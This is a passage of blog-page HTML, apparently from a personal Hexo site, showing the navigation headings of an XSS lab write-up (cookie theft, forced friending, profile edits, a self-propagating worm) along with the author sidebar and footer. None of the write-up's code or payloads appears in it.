class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-1"><span class="nav-number">3.1.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81-1"><span class="nav-number">3.2.</span> <span class="nav-text">实验代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4-1"><span class="nav-number">3.3.</span> <span class="nav-text">复现步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E7%BB%93%E6%9E%9C-1"><span class="nav-number">3.4.</span> <span class="nav-text">复现结果</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Task3-%E4%BB%8E%E5%8F%97%E5%AE%B3%E8%80%85%E7%9A%84%E6%9C%BA%E5%99%A8%E7%AA%83%E5%8F%96Cookie"><span class="nav-number">4.</span> <span class="nav-text">Task3:从受害者的机器窃取Cookie</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-2"><span class="nav-number">4.1.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81-2"><span class="nav-number">4.2.</span> <span class="nav-text">实验代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4-2"><span class="nav-number">4.3.</span> <span class="nav-text">复现步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E7%BB%93%E6%9E%9C-2"><span class="nav-number">4.4.</span> <span class="nav-text">复现结果</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Task4-%E6%94%BB%E5%87%BB%E8%80%85%E5%BC%BA%E5%88%B6%E5%8A%A0%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BA%E5%A5%BD%E5%8F%8B"><span class="nav-number">5.</span> <span class="nav-text">Task4:攻击者强制加受害者为好友</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-3"><span class="nav-number">5.1.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81-3"><span class="nav-number">5.2.</span> <span class="nav-text">实验代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4-3"><span class="nav-number">5.3.</span> <span class="nav-text">复现步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E7%BB%93%E6%9E%9C-3"><span class="nav-number">5.4.</span> <span class="nav-text">复现结果</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Task5-%E4%BF%AE%E6%94%B9%E5%8F%97%E5%AE%B3%E8%80%85%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="nav-number">6.</span> <span class="nav-text">Task5:修改受害者的配置文件信息</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-4"><span class="nav-number">6.1.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81-4"><span class="nav-number">6.2.</span> <span class="nav-text">实验代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4-4"><span class="nav-number">6.3.</span> <span class="nav-text">复现步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E7%BB%93%E6%9E%9C-4"><span class="nav-number">6.4.</span> <span class="nav-text">复现结果</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Task6-%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E4%BC%A0%E6%92%AD%E7%9A%84XSS%E8%A0%95%E8%99%AB"><span class="nav-number">7.</span> <span class="nav-text">Task6:编写一个自传播的XSS蠕虫</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-5"><span class="nav-number">7.1.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81-5"><span class="nav-number">7.2.</span> <span class="nav-text">实验代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4-5"><span class="nav-number">7.3.</span> <span class="nav-text">复现步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E7%BB%93%E6%9E%9C-5"><span class="nav-number">7.4.</span> <span class="nav-text">复现结果</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BF%83%E5%BE%97"><span class="nav-number">8.</span> <span class="nav-text">心得</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">isZeroStarChen</p>
+  <div class="site-description" itemprop="description">愿世间美好与你环环相扣</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/isZeroStar" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;isZeroStar" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/zero-one-mxc/" title="Cnblog → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;zero-one-mxc&#x2F;" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>Cnblog</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://litevymoment.github.io/" title="boringBoy → https:&#x2F;&#x2F;litevymoment.github.io&#x2F;" rel="noopener" target="_blank"><i class="fa fa-link fa-fw"></i>boringBoy</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://radiantzy.github.io/" title="StitchGirl → https:&#x2F;&#x2F;radiantzy.github.io&#x2F;" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>StitchGirl</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">暗明星辰</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
